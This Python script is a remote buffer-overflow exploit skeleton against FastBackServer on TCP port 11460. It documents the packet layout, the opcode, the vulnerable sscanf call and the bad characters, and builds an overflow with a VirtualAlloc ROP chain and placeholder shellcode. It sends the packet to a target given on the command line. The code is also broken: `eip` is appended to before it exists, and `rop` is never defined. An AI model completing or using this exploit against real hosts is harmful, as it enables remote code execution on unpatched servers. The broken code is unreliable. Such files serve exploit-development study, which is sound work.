#!/usr/bin/python

import socket
import sys
from struct import pack

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# psAgentCommand
buf = bytearray([0x41]*0x0C) # ??
buf += pack('<i', 0x2000) # Opcode for execution path
buf += pack('<i', 0x0) # offset 1
buf += pack('<i', 0x100) # size 1
buf += pack('<i', 0x100) # offset 2
buf += pack('<i', 0x100) # size 2
buf += pack('<i', 0x200) # offset 3
buf += pack('<i', 0x100) # size 3
buf += bytearray([0x41]*0x8) # ??

# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20
# Buffer overflow sscanf call: FastBackServer!FXCLI_SetConfFileChunk+0x40
# ROP starts at return from this sscanf

# psCommandBuffer
# va = skeleton VirtualAlloc call
va  = pack('<L', 0x56697274) # address of VirtualAlloc placeholder
va += pack('<L', 0x7368656c) # address of shellcode placeholder
va += pack('<L', 0x7368656c) # lpAddress placeholder
va += pack('<L', 0x42424242) # dwSize placeholder
va += pack('<L', 0x43434343) # flAllocationType placeholder
va += pack('<L', 0x45454545) # flProtect placeholder
# pre eip overflow offset (this gets sent before 'va', but needs to know its length)
offset = bytearray([0x50]*(276 - len(va))) 
# START ROP: eip control starts here, save current esp to a new register (esi)
eip += pack('<L', 0x01234567) # mov esp, ebp ; pop ebp ; ret

# Placeholder shellcode, right after rop in memory to return into after VirtualAlloc
shellcode = bytearray([0x69]*512) # dummy shellcode space

# format string of first buffer, expected input with overflow parameter
buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(offset+va+eip+rop+shellcode,0,0,0,0)
# Checksum + buf (psAgentCommand and psCommandBuffer)
buf = pack('>i', len(buf)-4) + buf

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
